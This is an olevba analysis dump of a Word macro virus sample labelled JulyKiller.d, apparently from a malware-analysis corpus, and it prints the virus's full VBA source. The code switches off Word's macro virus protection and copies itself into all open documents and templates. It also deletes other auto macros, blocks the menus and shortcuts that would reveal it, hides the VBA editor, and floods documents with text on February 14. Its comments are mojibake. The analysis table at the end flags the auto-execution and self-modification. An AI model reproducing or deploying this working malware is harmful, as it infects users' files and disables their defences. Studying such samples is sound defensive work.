olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.JulyKiller.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.JulyKiller.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO lcm.bas 
in file: Virus.MSWord.JulyKiller.d - OLE stream: 'Macros/VBA/lcm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    Dim file$               '´ò¿ªÎÄ¼þÎÄ¼þÃû
    Dim ans$          '±£´æ»Ø´ðµÄ×Ö·û´®
    Dim test           '»Ø´ðÌáÎÊµÄ´ÎÊý
    Dim path$
    Dim fpath$
    Dim mItem
    Dim cItem
    Dim aDoc               '´ò¿ªÎÄµµ
    Dim aTemp              '´ò¿ªÄ£°å
    Dim vset           '¸ÐÈ¾²¡¶¾Îª1
    Dim Iset           '´æÔÚÎÄ¼þÎª1
    Dim ad
    


    For Each ad In AddIns
    If ad.Name = "lcm.dot" Then
        ad.Installed = False
    End If
Next ad

path = Options.DefaultFilePath(wdUserTemplatesPath)
fpath = path + "\lcm.dot"
    
    'È¡Ïûºê²¡¶¾·À»¤
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
'¼ì²éÎÄ¼þÊÇ·ñ¸ÐÈ¾²¡¶¾
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "lcm") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
  '¼ì²éÄ£°åÊÇ·ñ¸ÐÈ¾²¡¶¾
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
       'Èç¹ûÃ»ÓÐ¸ÐÈ¾²¡¶¾£¬Ôò¸ÐÈ¾ËùÓÐ´ò¿ªµÄÎÄµµºÍÄ£°å¡£
        If vset <> 1 Then
        WordBasic.DisableAutoMacros       'ÖÕÖ¹×Ô¶¯ºêÔËÐÐ
        Documents.Open FileName:=fpath, AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aDoc.FullName + ":lcm"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aTemp.FullName + ":lcm"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
End If

'¼ì²éÊÇ·ñÓÐlcm.dot
    With Application.FileSearch
.LookIn = path
.FileName = "lcm.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
End With

'Ã»ÓÐlcm.dot ÎÄ¼þ£¬Ôò½¨Á¢Ò»¸ö¡£

    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":lcm", ActiveDocument.FullName + ":lcm"
        ActiveDocument.SaveAs FileName:=fpath, AddToRecentFiles:=False
        ActiveDocument.Close
    End If

'ÒÆÈ¥ÎÄ¼þÔ­ÓÐµÄautoopen,autonew,autoclose,filesaveºê¡£
    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aDoc

'ÒÆÈ¥Ä£°åÔ­ÓÐµÄautoopen,autonew,autoclose,filesaveºê¡£
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aTemp

'¸ÐÈ¾ËùÓÐ´ò¿ªµÄÎÄ¼þ¡£
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":lcm", aDoc.FullName + ":lcm"
        End If
Next aDoc

'¸ÐÈ¾ËùÓÐ´ò¿ªµÄÄ£°å¡£
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":lcm", aTemp.FullName + ":lcm"
        End If
    Next aTemp


'Óëºê¡¢Visual Basic ¡¢Ä£°åÓëÔØÏîµÈÓÐ¹ØµÄ¿ì½Ý¼ü¡¢²Ëµ¥Ñ¡ÔñÏî¡¢¹¤¾ßÌõ×Ô¶¯¹Ø±Õ¡£
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "×Ô¶¨Òå(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "Ä£°åºÍ¼ÓÔØÏî(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "Ñ¡Ïî(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "ºê(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "ºê(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic ±à¼­Æ÷(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    




exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub


Sub AutoExit()
    Dim file$               '´ò¿ªÎÄ¼þÎÄ¼þÃû
    Dim ans$          '±£´æ»Ø´ðµÄ×Ö·û´®
    Dim test           '»Ø´ðÌáÎÊµÄ´ÎÊý
    Dim path$
    Dim fpath$
    Dim mItem
    Dim cItem
    Dim aDoc               '´ò¿ªÎÄµµ
    Dim aTemp              '´ò¿ªÄ£°å
    Dim vset           '¸ÐÈ¾²¡¶¾Îª1
    Dim Iset           '´æÔÚÎÄ¼þÎª1
    Dim ad
    


    For Each ad In AddIns
    If ad.Name = "lcm.dot" Then
        ad.Installed = False
    End If
Next ad

path = Options.DefaultFilePath(wdUserTemplatesPath)
fpath = path + "\lcm.dot"
    
    'È¡Ïûºê²¡¶¾·À»¤
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
'¼ì²éÎÄ¼þÊÇ·ñ¸ÐÈ¾²¡¶¾
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "lcm") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
  '¼ì²éÄ£°åÊÇ·ñ¸ÐÈ¾²¡¶¾
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
       'Èç¹ûÃ»ÓÐ¸ÐÈ¾²¡¶¾£¬Ôò¸ÐÈ¾ËùÓÐ´ò¿ªµÄÎÄµµºÍÄ£°å¡£
        If vset <> 1 Then
        WordBasic.DisableAutoMacros       'ÖÕÖ¹×Ô¶¯ºêÔËÐÐ
        Documents.Open FileName:=fpath, AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aDoc.FullName + ":lcm"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aTemp.FullName + ":lcm"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
End If

'¼ì²éÊÇ·ñÓÐlcm.dot
    With Application.FileSearch
.LookIn = path
.FileName = "lcm.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
End With

'Ã»ÓÐlcm.dot ÎÄ¼þ£¬Ôò½¨Á¢Ò»¸ö¡£

    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":lcm", ActiveDocument.FullName + ":lcm"
        ActiveDocument.SaveAs FileName:=fpath, AddToRecentFiles:=False
        ActiveDocument.Close
    End If

'ÒÆÈ¥ÎÄ¼þÔ­ÓÐµÄautoopen,autonew,autoclose,filesaveºê¡£
    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aDoc

'ÒÆÈ¥Ä£°åÔ­ÓÐµÄautoopen,autonew,autoclose,filesaveºê¡£
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aTemp

'¸ÐÈ¾ËùÓÐ´ò¿ªµÄÎÄ¼þ¡£
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":lcm", aDoc.FullName + ":lcm"
        End If
Next aDoc

'¸ÐÈ¾ËùÓÐ´ò¿ªµÄÄ£°å¡£
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":lcm", aTemp.FullName + ":lcm"
        End If
    Next aTemp


'Óëºê¡¢Visual Basic ¡¢Ä£°åÓëÔØÏîµÈÓÐ¹ØµÄ¿ì½Ý¼ü¡¢²Ëµ¥Ñ¡ÔñÏî¡¢¹¤¾ßÌõ×Ô¶¯¹Ø±Õ¡£
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "×Ô¶¨Òå(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "Ä£°åºÍ¼ÓÔØÏî(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "Ñ¡Ïî(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "ºê(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "ºê(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic ±à¼­Æ÷(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    

exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub


Sub autoOpen()

    Dim file$               '´ò¿ªÎÄ¼þÎÄ¼þÃû
    Dim ans$          '±£´æ»Ø´ðµÄ×Ö·û´®
    Dim test           '»Ø´ðÌáÎÊµÄ´ÎÊý
    Dim path$
    Dim fpath$
    Dim mItem
    Dim cItem
    Dim aDoc               '´ò¿ªÎÄµµ
    Dim aTemp              '´ò¿ªÄ£°å
    Dim vset           '¸ÐÈ¾²¡¶¾Îª1
    Dim Iset           '´æÔÚÎÄ¼þÎª1
    Dim ad
    


    For Each ad In AddIns
    If ad.Name = "lcm.dot" Then
        ad.Installed = False
    End If
Next ad

path = Options.DefaultFilePath(wdUserTemplatesPath)
fpath = path + "lcm.dot"
    
    'È¡Ïûºê²¡¶¾·À»¤
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
'¼ì²éÎÄ¼þÊÇ·ñ¸ÐÈ¾²¡¶¾
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "lcm") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
  '¼ì²éÄ£°åÊÇ·ñ¸ÐÈ¾²¡¶¾
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
       'Èç¹ûÃ»ÓÐ¸ÐÈ¾²¡¶¾£¬Ôò¸ÐÈ¾ËùÓÐ´ò¿ªµÄÎÄµµºÍÄ£°å¡£
        If vset <> 1 Then
        WordBasic.DisableAutoMacros       'ÖÕÖ¹×Ô¶¯ºêÔËÐÐ
        Documents.Open FileName:=fpath, AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aDoc.FullName + ":lcm"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aTemp.FullName + ":lcm"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
End If

'¼ì²éÊÇ·ñÓÐlcm.dot
    With Application.FileSearch
.LookIn = path
.FileName = "lcm.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
End With

'Ã»ÓÐlcm.dot ÎÄ¼þ£¬Ôò½¨Á¢Ò»¸ö¡£

    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":lcm", ActiveDocument.FullName + ":lcm"
        ActiveDocument.SaveAs FileName:=fpath, AddToRecentFiles:=False
        ActiveDocument.Close
    End If

'ÒÆÈ¥ÎÄ¼þÔ­ÓÐµÄautoopen,autonew,autoclose,filesaveºê¡£
    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aDoc

'ÒÆÈ¥Ä£°åÔ­ÓÐµÄautoopen,autonew,autoclose,filesaveºê¡£
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aTemp

'¸ÐÈ¾ËùÓÐ´ò¿ªµÄÎÄ¼þ¡£
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":lcm", aDoc.FullName + ":lcm"
        End If
Next aDoc

'¸ÐÈ¾ËùÓÐ´ò¿ªµÄÄ£°å¡£
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":lcm", aTemp.FullName + ":lcm"
        End If
    Next aTemp


'Óëºê¡¢Visual Basic ¡¢Ä£°åÓëÔØÏîµÈÓÐ¹ØµÄ¿ì½Ý¼ü¡¢²Ëµ¥Ñ¡ÔñÏî¡¢¹¤¾ßÌõ×Ô¶¯¹Ø±Õ¡£
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "×Ô¶¨Òå(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "Ä£°åºÍ¼ÓÔØÏî(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "Ñ¡Ïî(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "ºê(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "ºê(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic ±à¼­Æ÷(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    

pun:
    If WordBasic.Month(WordBasic.Now()) = 2 And WordBasic.Day(WordBasic.Now()) = 14 Then
try:
        On Error GoTo -1: On Error GoTo 0
        On Error GoTo -1: On Error GoTo try
Selection.TypeParagraph
For i = 1 To 50
    Selection.TypeParagraph
    Selection.TypeText Text:="HI£¬ÄãºÃ£¡ "
    Selection.TypeParagraph
    Selection.TypeText Text:="  ½ñÌìÊÇÇéÈË½Ú£¬ÎÒÓÖÏëÆðÁËÄÇ´¬£¬ÄÇºÓºÍÔÚÄÇÌõºÓºÍ´¬ÉÏÓöµ½µÄÒ»¸öÔøÏëÎªÖ®ÉúÎªÖ®ËÀµÄÅ®º¢£¬»¹ÓÐÒ»Ìõ×ÔÒÑÏÖÔÚÎÞÄÜÎªÁ¦Òª»»»ØµÄÏîÁ´......"
    Selection.TypeParagraph
Next i
End If
Selection.TypeParagraph


exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub



Sub AutoNew()
    Dim file$               '´ò¿ªÎÄ¼þÎÄ¼þÃû
    Dim ans$          '±£´æ»Ø´ðµÄ×Ö·û´®
    Dim test           '»Ø´ðÌáÎÊµÄ´ÎÊý
    Dim path$
    Dim fpath$
    Dim mItem
    Dim cItem
    Dim aDoc               '´ò¿ªÎÄµµ
    Dim aTemp              '´ò¿ªÄ£°å
    Dim vset           '¸ÐÈ¾²¡¶¾Îª1
    Dim Iset           '´æÔÚÎÄ¼þÎª1
    Dim ad
    


    For Each ad In AddIns
    If ad.Name = "lcm.dot" Then
        ad.Installed = False
    End If
Next ad

path = Options.DefaultFilePath(wdUserTemplatesPath)
fpath = path + "\lcm.dot"
    
    'È¡Ïûºê²¡¶¾·À»¤
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
'¼ì²éÎÄ¼þÊÇ·ñ¸ÐÈ¾²¡¶¾
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "lcm") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
  '¼ì²éÄ£°åÊÇ·ñ¸ÐÈ¾²¡¶¾
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
       'Èç¹ûÃ»ÓÐ¸ÐÈ¾²¡¶¾£¬Ôò¸ÐÈ¾ËùÓÐ´ò¿ªµÄÎÄµµºÍÄ£°å¡£
        If vset <> 1 Then
        WordBasic.DisableAutoMacros       'ÖÕÖ¹×Ô¶¯ºêÔËÐÐ
        Documents.Open FileName:=fpath, AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aDoc.FullName + ":lcm"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aTemp.FullName + ":lcm"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
End If

'¼ì²éÊÇ·ñÓÐlcm.dot
    With Application.FileSearch
.LookIn = path
.FileName = "lcm.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
End With

'Ã»ÓÐlcm.dot ÎÄ¼þ£¬Ôò½¨Á¢Ò»¸ö¡£

    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":lcm", ActiveDocument.FullName + ":lcm"
        ActiveDocument.SaveAs FileName:=fpath, AddToRecentFiles:=False
        ActiveDocument.Close
    End If

'ÒÆÈ¥ÎÄ¼þÔ­ÓÐµÄautoopen,autonew,autoclose,filesaveºê¡£
    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aDoc

'ÒÆÈ¥Ä£°åÔ­ÓÐµÄautoopen,autonew,autoclose,filesaveºê¡£
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aTemp

'¸ÐÈ¾ËùÓÐ´ò¿ªµÄÎÄ¼þ¡£
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":lcm", aDoc.FullName + ":lcm"
        End If
Next aDoc

'¸ÐÈ¾ËùÓÐ´ò¿ªµÄÄ£°å¡£
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":lcm", aTemp.FullName + ":lcm"
        End If
    Next aTemp


'Óëºê¡¢Visual Basic ¡¢Ä£°åÓëÔØÏîµÈÓÐ¹ØµÄ¿ì½Ý¼ü¡¢²Ëµ¥Ñ¡ÔñÏî¡¢¹¤¾ßÌõ×Ô¶¯¹Ø±Õ¡£
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "×Ô¶¨Òå(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "Ä£°åºÍ¼ÓÔØÏî(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "Ñ¡Ïî(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "ºê(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "ºê(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic ±à¼­Æ÷(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    

pun:
    If WordBasic.Month(WordBasic.Now()) = 2 And WordBasic.Day(WordBasic.Now()) = 14 Then
try:
        On Error GoTo -1: On Error GoTo 0
        On Error GoTo -1: On Error GoTo try
Selection.TypeParagraph
For i = 1 To 50
    Selection.TypeParagraph
    Selection.TypeText Text:="HI£¬ÄãºÃ£¡ "
    Selection.TypeParagraph
    Selection.TypeText Text:="  ½ñÌìÊÇÇéÈË½Ú£¬ÎÒÓÖÏëÆðÁËÄÇ´¬£¬ÄÇºÓºÍÔÚÄÇÌõºÓºÍ´¬ÉÏÓöµ½µÄÒ»¸öÔøÏëÎªÖ®ÉúÎªÖ®ËÀµÄÅ®º¢£¬»¹ÓÐÒ»Ìõ×ÔÒÑÏÖÔÚÎÞÄÜÎªÁ¦Òª»»»ØµÄÏîÁ´......"
    Selection.TypeParagraph
Next i
End If
Selection.TypeParagraph


exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
